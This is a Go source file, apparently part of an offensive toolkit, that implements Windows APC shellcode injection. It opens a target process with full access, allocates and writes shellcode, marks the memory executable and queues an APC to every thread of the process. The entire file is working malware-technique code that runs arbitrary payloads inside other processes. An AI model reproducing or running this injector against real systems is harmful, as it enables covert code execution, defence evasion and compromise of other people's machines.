// +build windows

package injection

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// APCInjector implements APC (Asynchronous Procedure Call) injection
type APCInjector struct{}

// Method returns the injection method
func (i *APCInjector) Method() InjectionMethod {
	return MethodAPC
}

// Description returns a description of the injection method
func (i *APCInjector) Description() string {
	return "APC Injection: Injects shellcode by queuing it to a thread's APC queue. " +
		"The thread must be in an alertable state for the APC to execute. " +
		"Steps: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> QueueUserAPC"
}

// Inject performs APC injection
func (i *APCInjector) Inject(config *Config) (*Result, error) {
	// Validate configuration
	if err := config.Validate(i.Method()); err != nil {
		return &Result{Success: false, Error: err.Error()}, err
	}

	// 1. Open the target process
	process, err := OpenProcess(PROCESS_ALL_ACCESS, false, uint32(config.TargetPID))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to open process %d: %v", config.TargetPID, err),
		}, err
	}
	defer windows.CloseHandle(process)

	// 2. Allocate memory in the target process
	addr, err := VirtualAllocEx(process, 0, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to allocate memory in process: %v", err),
		}, err
	}

	// 3. Write shellcode to the allocated memory
	_, err = WriteProcessMemory(process, addr, config.Shellcode)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to write shellcode: %v", err),
		}, err
	}

	// 4. Change memory protection to executable
	_, err = VirtualProtectEx(process, addr, uintptr(len(config.Shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to change memory protection: %v", err),
		}, err
	}

	// 5. Find all threads in the target process
	threads, err := FindThreadsByProcessID(uint32(config.TargetPID))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to find threads: %v", err),
		}, err
	}

	if len(threads) == 0 {
		return &Result{
			Success: false,
			Error:   "no threads found in target process",
		}, fmt.Errorf("no threads found in target process")
	}

	// 6. Queue the APC to each thread (try all threads to increase success rate)
	var successCount int
	var lastError error

	for _, threadID := range threads {
		// Open the thread
		thread, err := windows.OpenThread(THREAD_ALL_ACCESS, false, threadID)
		if err != nil {
			lastError = err
			continue
		}

		// Queue the APC
		err = QueueUserAPC(addr, thread, 0)
		windows.CloseHandle(thread)

		if err == nil {
			successCount++
		} else {
			lastError = err
		}
	}

	if successCount == 0 {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to queue APC to any thread: %v", lastError),
		}, lastError
	}

	return &Result{
		Success:   true,
		ProcessID: uint32(config.TargetPID),
		Error:     fmt.Sprintf("APC queued to %d thread(s)", successCount),
	}, nil
}